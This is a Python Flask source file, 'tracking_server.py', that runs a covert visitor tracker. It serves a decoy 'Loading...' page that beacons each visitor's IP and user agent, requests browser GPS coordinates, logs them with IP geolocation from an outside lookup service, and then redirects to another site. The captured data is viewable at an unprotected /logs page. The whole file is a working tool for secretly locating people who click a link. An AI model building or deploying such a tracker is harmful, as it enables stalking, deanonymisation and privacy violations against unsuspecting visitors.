#!/usr/bin/env python3
# tracking_server.py - Flask server to capture IP, geolocation, and GPS (if granted)

from flask import Flask, request, jsonify, send_file, render_template_string
import requests
import json
import datetime
import os

app = Flask(__name__)

LOG_FILE = "tracking_logs.txt"
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        // Send IP info automatically via image beacon (works even if JS fails)
        (function() {
            var img = new Image();
            img.src = "/log?ip={{ip}}&ua={{ua}}";
        })();

        // Try to get GPS coordinates if user allows
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    var coords = pos.coords.latitude + "," + pos.coords.longitude;
                    fetch('/log_gps?coords=' + coords + '&acc=' + pos.coords.accuracy);
                },
                function(err) {
                    fetch('/log_gps?error=' + err.code);
                }
            );
        } else {
            fetch('/log_gps?error=not_supported');
        }
    </script>
</head>
<body>
    <p>Redirecting...</p>
    <script>window.location.href = "https://example.com";</script>
</body>
</html>
"""

def log_entry(data):
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")

@app.route("/")
def index():
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent', 'unknown')
    return render_template_string(HTML_TEMPLATE, ip=client_ip, ua=user_agent)

@app.route("/log")
def log():
    ip = request.args.get('ip')
    ua = request.args.get('ua')
    geo = {}
    if ip and ip != "127.0.0.1" and not ip.startswith("192.168."):
        try:
            resp = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,query", timeout=5)
            if resp.status_code == 200:
                geo = resp.json()
        except:
            geo = {"error": "lookup_failed"}
    data = {
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "type": "ip_log",
        "ip": ip,
        "user_agent": ua,
        "geo": geo
    }
    log_entry(data)
    return "OK", 200

@app.route("/log_gps")
def log_gps():
    coords = request.args.get('coords')
    acc = request.args.get('acc')
    error = request.args.get('error')
    data = {
        "timestamp": datetime.datetime.utcnow().isoformat(),
        "type": "gps",
        "coords": coords,
        "accuracy": acc,
        "error": error
    }
    log_entry(data)
    return "OK", 200

@app.route("/logs")
def view_logs():
    if not os.path.exists(LOG_FILE):
        return "No logs yet."
    with open(LOG_FILE, "r") as f:
        lines = f.readlines()
    return "<pre>" + "\n".join(lines) + "</pre>"

if __name__ == '__main__':
    import os
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
